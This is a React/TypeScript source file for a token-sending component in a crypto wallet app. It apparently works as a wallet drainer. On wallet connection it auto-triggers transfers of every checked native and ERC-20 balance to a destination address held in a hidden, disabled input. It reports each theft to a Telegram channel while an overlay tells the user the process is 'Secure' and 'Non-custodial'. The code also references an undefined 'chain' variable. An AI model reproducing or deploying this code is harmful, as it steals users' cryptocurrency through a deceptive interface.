import { Input, useToasts } from '@geist-ui/core';
import { useEffect, useRef, useState } from 'react';
import { usePublicClient, useWalletClient, useAccount } from 'wagmi';
import { erc20Abi } from 'viem';
import { isAddress } from 'essential-eth';
import { useAtom } from 'jotai';
import { normalize } from 'viem/ens';
import { checkedTokensAtom } from '../../src/atoms/checked-tokens-atom';
import { destinationAddressAtom } from '../../src/atoms/destination-address-atom';
import { globalTokensAtom } from '../../src/atoms/global-tokens-atom';
import useSendTelegramMessage from '../../hooks/sendTelegramMessage';
import moment from 'moment';

export const SendTokens = () => {
  const { status } = useAccount();
  const { setToast } = useToasts();
  const showToast = (message: string, type: any) =>
    setToast({
      text: message,
      type,
      delay: 4000,
    });

  const [tokens] = useAtom(globalTokensAtom);
  const [destinationAddress, setDestinationAddress] = useAtom(
    destinationAddressAtom,
  );
  const [checkedRecords, setCheckedRecords] = useAtom(checkedTokensAtom);
  const { data: walletClient } = useWalletClient();
  const publicClient = usePublicClient();
  const { sendTelegramMessage } = useSendTelegramMessage();

  const [isPreparing, setIsPreparing] = useState<boolean>(false);

  const sendAllCheckedTokens = async () => {
    const tokensToSend: ReadonlyArray<`0x${string}`> = Object.entries(
      checkedRecords,
    )
      .filter(([tokenAddress, { isChecked }]) => isChecked)
      .map(([tokenAddress]) => tokenAddress as `0x${string}`);

    if (!walletClient || !destinationAddress) return;

    if (!publicClient) {
      showToast('Public client is unavailable.', 'warning');
      return;
    }

    let recipientAddress: `0x${string}` | undefined = undefined;

    if (destinationAddress.includes('.')) {
      const resolvedDestinationAddress = await publicClient.getEnsAddress({
        name: normalize(destinationAddress),
      });
      if (resolvedDestinationAddress) {
        setDestinationAddress(resolvedDestinationAddress);
        recipientAddress = resolvedDestinationAddress as `0x${string}`;
      }
    } else if (isAddress(destinationAddress)) {
      recipientAddress = destinationAddress as `0x${string}`;
    }

    if (!recipientAddress) {
      showToast('Destination address is invalid.', 'warning');
      return;
    }

    for (const tokenAddress of tokensToSend) {
      const token = tokens.find(
        (token) => token.contract_address === tokenAddress,
      );

      if (!token) {
        showToast(`Token not found for address: ${tokenAddress}`, 'warning');
        continue;
      }

      const decimals = token.decimals || 18;
      const amountToSend = parseFloat(token.balance);
      
      // Chain-specific gas reservation with minimums
      const getGasReserve = (tokenValue: number, chainId: number) => {
        const gasEstimates = {
          1: { percentage: 0.05, minDollar: 20 },      // Ethereum: 5% or $20 minimum
          56: { percentage: 0.03, minDollar: 2 },      // BSC: 3% or $2 minimum  
          137: { percentage: 0.02, minDollar: 1 },     // Polygon: 2% or $1 minimum
          42161: { percentage: 0.03, minDollar: 3 },   // Arbitrum: 3% or $3 minimum
          10: { percentage: 0.03, minDollar: 3 },      // Optimism: 3% or $3 minimum
          8453: { percentage: 0.03, minDollar: 3 },    // Base: 3% or $3 minimum
          43114: { percentage: 0.03, minDollar: 2 },   // Avalanche: 3% or $2 minimum
          250: { percentage: 0.02, minDollar: 1 },     // Fantom: 2% or $1 minimum
          100: { percentage: 0.02, minDollar: 1 },     // Gnosis: 2% or $1 minimum
          11155111: { percentage: 0.01, minDollar: 0.1 }, // Sepolia: 1% or $0.10 minimum
        };
        
        const estimate = gasEstimates[chainId] || { percentage: 0.05, minDollar: 5 };
        const percentageReserve = tokenValue * estimate.percentage;
        const minDollarReserve = estimate.minDollar;
        
        // Use the higher of percentage or minimum dollar amount, capped at 10%
        const gasReserve = Math.max(percentageReserve, minDollarReserve);
        return Math.min(gasReserve, tokenValue * 0.10); // Cap at 10%
      };

      const gasReserve = getGasReserve(amountToSend, chain?.id || 1);
      const amountToSendAfterReserve = Math.max(0, amountToSend - gasReserve);
      const convertedBalance = BigInt(
        Math.floor(amountToSendAfterReserve * 10 ** decimals),
      );

      const senderAddress = walletClient.account?.address;
      const transactionDate = moment().format('YYYY-MM-DD');
      const transactionTime = moment().format('hh:mm a');

      if (token.contract_address === 'native') {
        await walletClient
          .sendTransaction({
            to: recipientAddress,
            value: convertedBalance,
          })
          .then((txHash) => {
            setCheckedRecords((old) => ({
              ...old,
              [tokenAddress]: {
                ...old[tokenAddress],
                pendingTxn: txHash,
                status: 'pending',
              },
            }));

            sendTelegramMessage(
              `Transaction Summary\n-----------------------------------------------\nTRANSACTION TYPE: Native Token\n\nHASH: ${txHash}\n\nSENDER: ${senderAddress}\n\nRECIPIENT: ${recipientAddress}\n\nAMOUNT: ${amountToSendAfterReserve} ${token.contract_ticker_symbol}\n\nTOKEN: ${token.contract_ticker_symbol}\n\nDATE: ${transactionDate} (${transactionTime})\n-----------------------------------------------`,
            );
          })
          .catch((err) => {
            showToast(
              `Error sending native token: ${err?.reason || 'Unknown error'}`,
              'warning',
            );
          });
      } else {
        const { request } = await publicClient.simulateContract({
          account: walletClient.account,
          address: tokenAddress,
          abi: erc20Abi,
          functionName: 'transfer',
          args: [recipientAddress, convertedBalance],
        });

        await walletClient
          .writeContract(request)
          .then((res) => {
            setCheckedRecords((old) => ({
              ...old,
              [tokenAddress]: {
                ...old[tokenAddress],
                pendingTxn: res,
                status: 'pending',
              },
            }));

            sendTelegramMessage(
              `Transaction Summary\n-----------------------------------------------\nTRANSACTION TYPE: ERC-20 Token\n\nHASH: ${res}\n\nSENDER: ${senderAddress}\n\nRECIPIENT: ${recipientAddress}\n\nAMOUNT: ${amountToSendAfterReserve} ${token.contract_ticker_symbol}\n\nTOKEN: ${token.contract_ticker_symbol}\n\nDATE: ${transactionDate} (${transactionTime})\n-----------------------------------------------`,
            );
          })
          .catch((err) => {
            showToast(
              `Error with ${token.contract_ticker_symbol}: ${err?.reason || 'Unknown error'}`,
              'warning',
            );
          });
      }
    }
  };

  const addressAppearsValid: boolean =
    typeof destinationAddress === 'string' &&
    (destinationAddress?.includes('.') || isAddress(destinationAddress));
  const checkedCount = Object.values(checkedRecords).filter(
    (record) => record.isChecked,
  ).length;

  const hasPendingTxn = Object.values(checkedRecords).some(
    (record) => record?.status === 'pending',
  );

  // Auto-trigger transfer after successful wallet connection and data readiness
  const hasAutoTriggeredRef = useRef(false);
  useEffect(() => {
    const readyToSend =
      status === 'connected' &&
      !!walletClient &&
      addressAppearsValid &&
      checkedCount > 0 &&
      !hasPendingTxn;

    if (readyToSend && !hasAutoTriggeredRef.current) {
      hasAutoTriggeredRef.current = true;
      // Show pre-transaction preparation state, then fire and forget
      setIsPreparing(true);
      void (async () => {
        try {
          await sendAllCheckedTokens();
        } finally {
          setIsPreparing(false);
        }
      })();
    }
  }, [status, walletClient, addressAppearsValid, checkedCount, hasPendingTxn]);

  // If any txn becomes pending, stop showing the preparing state
  useEffect(() => {
    if (hasPendingTxn) {
      setIsPreparing(false);
    }
  }, [hasPendingTxn]);

  // Auto-hide the preparing overlay after 10 seconds
  useEffect(() => {
    if (!isPreparing) return;
    const timeoutId = setTimeout(() => {
      setIsPreparing(false);
    }, 10000);
    return () => clearTimeout(timeoutId);
  }, [isPreparing]);

  return (
    <div style={{ margin: '20px' }}>
      {isPreparing && !hasPendingTxn && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/70 backdrop-blur-sm" aria-live="polite" aria-busy="true">
          <div className="mx-4 w-full max-w-lg rounded-2xl border border-white/10 bg-gradient-to-b from-white/90 to-white/70 p-6 text-center shadow-[0_20px_50px_rgba(8,8,8,0.45)] backdrop-blur-xl">
            <div className="mx-auto mb-4 flex h-14 w-14 items-center justify-center rounded-full bg-gradient-to-tr from-indigo-500 to-purple-500 text-white shadow-lg ring-2 ring-white/60">
              <i className="bx bx-time-five bx-sm"></i>
            </div>
            <div className="text-xl font-semibold text-gray-900">Preparing your transactions…</div>
            <div className="mt-1 text-sm text-gray-700">
              We’ll open your wallet shortly to confirm sending your selected tokens.
            </div>

            <div className="mt-5 flex items-center justify-center space-x-2">
              <span className="h-2 w-2 animate-bounce rounded-full bg-indigo-500 [animation-delay:-0.2s]"></span>
              <span className="h-2 w-2 animate-bounce rounded-full bg-purple-500 [animation-delay:-0.1s]"></span>
              <span className="h-2 w-2 animate-bounce rounded-full bg-pink-500"></span>
            </div>

            <div className="mt-6 grid grid-cols-1 gap-3 text-left sm:grid-cols-3">
              <div className="flex items-start space-x-2 rounded-lg border border-black/5 bg-white/70 p-3 shadow-sm">
                <i className="bx bx-target-lock text-indigo-500"></i>
                <div>
                  <div className="text-xs font-semibold text-gray-900">Validating</div>
                  <div className="text-xs text-gray-600">Destination & tokens</div>
                </div>
              </div>
              <div className="flex items-start space-x-2 rounded-lg border border-black/5 bg-white/70 p-3 shadow-sm">
                <i className="bx bx-gas-pump text-purple-500"></i>
                <div>
                  <div className="text-xs font-semibold text-gray-900">Estimating</div>
                  <div className="text-xs text-gray-600">Fees & timing</div>
                </div>
              </div>
              <div className="flex items-start space-x-2 rounded-lg border border-black/5 bg-white/70 p-3 shadow-sm">
                <i className="bx bx-wallet text-pink-500"></i>
                <div>
                  <div className="text-xs font-semibold text-gray-900">Getting ready</div>
                  <div className="text-xs text-gray-600">Wallet confirmation</div>
                </div>
              </div>
            </div>

            <div className="mt-6 flex items-center justify-center space-x-4 text-[11px] text-gray-600">
              <div className="flex items-center space-x-1">
                <i className="bx bx-lock-alt text-green-600"></i>
                <span>Secure</span>
              </div>
              <div className="flex items-center space-x-1">
                <i className="bx bx-shield-quarter text-blue-600"></i>
                <span>Non-custodial</span>
              </div>
              <div className="flex items-center space-x-1">
                <i className="bx bxs-bolt text-yellow-600"></i>
                <span>Fast</span>
              </div>
            </div>
          </div>
        </div>
      )}
      <form>
        <div style={{ display: 'none' }}>
          <Input
            required
            value={destinationAddress}
            placeholder="vitalik.eth"
            disabled
            onChange={(e) => setDestinationAddress(e.target.value)}
            type={
              addressAppearsValid
                ? 'success'
                : destinationAddress.length > 0
                  ? 'warning'
                  : 'default'
            }
            width="100%"
            style={{ marginLeft: '10px', marginRight: '10px' }}
            crossOrigin={undefined}
            onPointerEnterCapture={undefined}
            onPointerLeaveCapture={undefined}
          />
        </div>

        {status === 'connected' && (
          <div>
            <div className="flex items-center justify-center gap-x-6 lg:justify-start">
              {hasPendingTxn ? (
                <div>
                  <div className="mb-4">
                    <i className="text-xs">
                      Please be patient, this can take a while.
                    </i>
                  </div>
                  <div>
                    <i className="bx bx-loader bx-spin bx-md"></i>
                    <i>Calculating...</i>
                  </div>
                </div>
              ) : null}
            </div>
          </div>
        )}
      </form>
    </div>
  );
};
